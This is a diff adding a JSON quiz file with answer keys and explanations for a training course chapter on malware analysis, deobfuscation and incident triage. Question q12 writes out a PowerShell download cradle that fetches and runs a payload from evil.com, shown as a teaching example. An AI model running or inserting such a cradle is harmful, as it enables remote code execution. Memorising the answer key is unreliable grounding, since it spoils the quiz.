@@ -1,0 +1,311 @@
+{
+    "id": "quiz_ch_9",
+    "chapterId": "ch_9",
+    "title": "Chapter 9 Mastery Quiz",
+    "description": "Test your knowledge of malware analysis techniques, static and dynamic analysis, and script deobfuscation.",
+    "passingScore": 70,
+    "xpReward": 50,
+    "questions": [
+        {
+            "id": "q1",
+            "type": "mcq",
+            "question": "What is the primary goal of static malware analysis?",
+            "options": [
+                "To execute the malware and observe its behavior.",
+                "To examine the file without executing it, extracting hashes, strings, and IOCs.",
+                "To reverse engineer the assembly code in a debugger.",
+                "To clean the infected system."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Static analysis is safe examination without execution."
+        },
+        {
+            "id": "q2",
+            "type": "true_false",
+            "question": "A clean VirusTotal report (0 detections) guarantees that a file is safe to open.",
+            "correctAnswer": false,
+            "explanation": "False. Zero detections could mean the sample is new, custom, or packed."
+        },
+        {
+            "id": "q3",
+            "type": "fill_blank",
+            "question": "The tool `strings.exe` is used to extract _____ text from a binary file without executing it.",
+            "options": [
+                "Encrypted",
+                "Readable (ASCII/Unicode)",
+                "Binary",
+                "Compressed"
+            ],
+            "correctAnswer": "Readable (ASCII/Unicode)",
+            "explanation": "Strings extracts sequences of printable characters, often revealing embedded commands, URLs, or IPs."
+        },
+        {
+            "id": "q4",
+            "type": "mcq",
+            "question": "What does high entropy (>7.0) in the .text section of a PE file usually indicate?",
+            "options": [
+                "The file is digitally signed.",
+                "The file is packed or encrypted.",
+                "The file is a legitimate Windows system file.",
+                "The file is corrupted."
+            ],
+            "correctAnswer": 1,
+            "explanation": "High entropy suggests compression or encryption, common in packed malware to hide the real code."
+        },
+        {
+            "id": "q5",
+            "type": "mcq",
+            "question": "Which of the following is NOT a typical dynamic analysis tool?",
+            "options": [
+                "Process Monitor (Procmon)",
+                "Wireshark",
+                "PE-bear",
+                "Regshot"
+            ],
+            "correctAnswer": 2,
+            "explanation": "PE-bear is a static analysis tool for examining PE file structure. The others are used during execution."
+        },
+        {
+            "id": "q6",
+            "type": "mcq",
+            "question": "What is the purpose of INetSim in a malware analysis lab?",
+            "options": [
+                "To accelerate internet speed.",
+                "To simulate common internet services (DNS, HTTP) so malware believes it's online without reaching the real internet.",
+                "To encrypt network traffic.",
+                "To act as a firewall."
+            ],
+            "correctAnswer": 1,
+            "explanation": "INetSim fakes internet responses, safely capturing C2 domains without actual outbound connections."
+        },
+        {
+            "id": "q7",
+            "type": "mcq",
+            "question": "In Process Monitor, which operation would indicate malware attempting to survive a reboot?",
+            "options": [
+                "RegQueryValue",
+                "RegSetValue to HKLM\\...\\Run",
+                "Process Start",
+                "TCP Connect"
+            ],
+            "correctAnswer": 1,
+            "explanation": "Writing to the Run registry key ensures the malware starts automatically when Windows boots."
+        },
+        {
+            "id": "q8",
+            "type": "true_false",
+            "question": "When analyzing a malicious Office document, you should always enable macros to see what happens.",
+            "correctAnswer": false,
+            "explanation": "False. Never enable macros. Use static extraction tools like oledump.py to safely view the VBA code."
+        },
+        {
+            "id": "q9",
+            "type": "fill_blank",
+            "question": "The `M` flag in `oledump.py` output indicates that a stream contains _____ code.",
+            "options": [
+                "Macro (VBA)",
+                "Metadata",
+                "Malware",
+                "Multimedia"
+            ],
+            "correctAnswer": "Macro (VBA)",
+            "explanation": "M stands for Macro, identifying streams with embedded VBA scripts."
+        },
+        {
+            "id": "q10",
+            "type": "mcq",
+            "question": "What is a 'Remote Template Injection' attack in the context of Office documents?",
+            "options": [
+                "A macro that downloads a template from the internet.",
+                "A document that references an external template file hosted on a malicious server, triggering code execution when loaded.",
+                "A technique to hide text in a document.",
+                "Sending a document as an email attachment."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Remote template injection bypasses local macro scanning by loading malicious code from a URL."
+        },
+        {
+            "id": "q11",
+            "type": "mcq",
+            "question": "What is the correct text encoding to use when decoding a PowerShell `-EncodedCommand` Base64 string?",
+            "options": [
+                "UTF-8",
+                "ASCII",
+                "UTF-16LE (Unicode)",
+                "UTF-32"
+            ],
+            "correctAnswer": 2,
+            "explanation": "PowerShell expects a Unicode (UTF-16LE) byte array for encoded commands."
+        },
+        {
+            "id": "q12",
+            "type": "mcq",
+            "question": "Which PowerShell command is a classic 'download cradle'?",
+            "options": [
+                "Get-Process",
+                "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
+                "Set-ExecutionPolicy Bypass",
+                "Get-ChildItem"
+            ],
+            "correctAnswer": 1,
+            "explanation": "This downloads and executes a remote script in memory without writing to disk."
+        },
+        {
+            "id": "q13",
+            "type": "mcq",
+            "question": "You see a VBA macro containing the string `StrReverse(\"llehsrewop\")`. What does this evaluate to?",
+            "options": [
+                "powershell",
+                "cmd.exe",
+                "wscript",
+                "nothing"
+            ],
+            "correctAnswer": 0,
+            "explanation": "StrReverse reverses the string. 'llehsrewop' reversed is 'powershell'."
+        },
+        {
+            "id": "q14",
+            "type": "true_false",
+            "question": "Process Hollowing is a technique where malware creates a legitimate process in a suspended state and replaces its memory with malicious code.",
+            "correctAnswer": true,
+            "explanation": "True. This allows malware to hide inside a trusted process like svchost.exe."
+        },
+        {
+            "id": "q15",
+            "type": "fill_blank",
+            "question": "In dynamic analysis, a snapshot tool like _____ captures the 'before and after' state of the Windows Registry to highlight changes made by malware.",
+            "options": [
+                "Procmon",
+                "Regshot",
+                "Wireshark",
+                "PE-bear"
+            ],
+            "correctAnswer": "Regshot",
+            "explanation": "Regshot compares two registry snapshots to show added, modified, or deleted keys/values."
+        },
+        {
+            "id": "q16",
+            "type": "mcq",
+            "question": "Which of these is an indicator that a PE file is likely packed?",
+            "options": [
+                "Many imported DLL functions.",
+                "Low entropy and many readable strings.",
+                "Very few imports and high entropy.",
+                "A valid digital signature."
+            ],
+            "correctAnswer": 2,
+            "explanation": "Packers compress the code, resulting in high entropy and minimal imports (resolved dynamically)."
+        },
+        {
+            "id": "q17",
+            "type": "mcq",
+            "question": "What is the safest way to extract the URL from a malicious QR code in a phishing email?",
+            "options": [
+                "Scan it with your personal phone camera.",
+                "Use an online QR decoder that outputs the text without navigating to it.",
+                "Print it out and scan it with a separate device.",
+                "Forward it to IT."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Online QR decoders safely extract the text string without risking a connection from your phone."
+        },
+        {
+            "id": "q18",
+            "type": "mcq",
+            "question": "In a sandbox report, you see a signature: 'Cobalt Strike Beacon detected' and JA3 hash `a0e9f5d64349fb1319c0c5c3cd631c8b`. What is the appropriate response?",
+            "options": [
+                "Ignore it; it's a false positive.",
+                "Escalate as a critical incident and isolate the host.",
+                "Run a quick antivirus scan.",
+                "Wait to see if it happens again."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Cobalt Strike is a post-exploitation framework. Its presence indicates an active attacker with hands-on-keyboard access."
+        },
+        {
+            "id": "q19",
+            "type": "fill_blank",
+            "question": "The command `Get-FileHash -Algorithm SHA256 .\\malware.exe` is used to calculate the _____ of a file.",
+            "options": [
+                "Entropy",
+                "Signature",
+                "Hash",
+                "Size"
+            ],
+            "correctAnswer": "Hash",
+            "explanation": "File hashes uniquely identify a file's content and are used for reputation checks."
+        },
+        {
+            "id": "q20",
+            "type": "mcq",
+            "question": "Why is it important to revert to a clean VM snapshot after each dynamic analysis session?",
+            "options": [
+                "To save disk space.",
+                "To ensure the next sample analyzed is not contaminated by artifacts or persistence from the previous malware.",
+                "To improve VM performance.",
+                "It's not necessary."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Reverting ensures a known-clean baseline, preventing cross-contamination of analysis results."
+        },
+        {
+            "id": "q21",
+            "type": "true_false",
+            "question": "AMSI (Antimalware Scan Interface) can log deobfuscated PowerShell script blocks to Windows Event Log (Event ID 4104).",
+            "correctAnswer": true,
+            "explanation": "True. AMSI provides defenders with the plaintext script after deobfuscation, even if the original was encoded."
+        },
+        {
+            "id": "q22",
+            "type": "mcq",
+            "question": "Which CyberChef operation is used to reverse a string?",
+            "options": [
+                "Reverse",
+                "Fork",
+                "Magic",
+                "From Base64"
+            ],
+            "correctAnswer": 0,
+            "explanation": "The 'Reverse' operation reverses character order."
+        },
+        {
+            "id": "q23",
+            "type": "mcq",
+            "question": "What is the primary difference between static and dynamic analysis?",
+            "options": [
+                "Static analysis requires an internet connection; dynamic does not.",
+                "Static analysis examines the file without running it; dynamic analysis involves execution.",
+                "Static analysis is only for Linux files.",
+                "There is no difference."
+            ],
+            "correctAnswer": 1,
+            "explanation": "Static = no execution. Dynamic = execution in a controlled environment."
+        },
+        {
+            "id": "q24",
+            "type": "fill_blank",
+            "question": "The tool _____ is a Python utility that can extract and decode VBA macros from Office documents.",
+            "options": [
+                "oledump.py",
+                "Procmon",
+                "Wireshark",
+                "PE-bear"
+            ],
+            "correctAnswer": "oledump.py",
+            "explanation": "Oledump (part of oletools) is the industry standard for maldoc triage."
+        },
+        {
+            "id": "q25",
+            "type": "mcq",
+            "question": "A user reports an email with an attached `.iso` file. As a Tier 1 analyst, what is the correct action?",
+            "options": [
+                "Tell the user to open it and see what's inside.",
+                "Quarantine the email and submit the `.iso` to a sandbox for analysis.",
+                "Delete the email without investigation.",
+                "Forward it to the entire company as a warning."
+            ],
+            "correctAnswer": 1,
+            "explanation": "ISO files are high-risk and often contain malware. They must be analyzed safely in a sandbox."
+        }
+    ]
+}
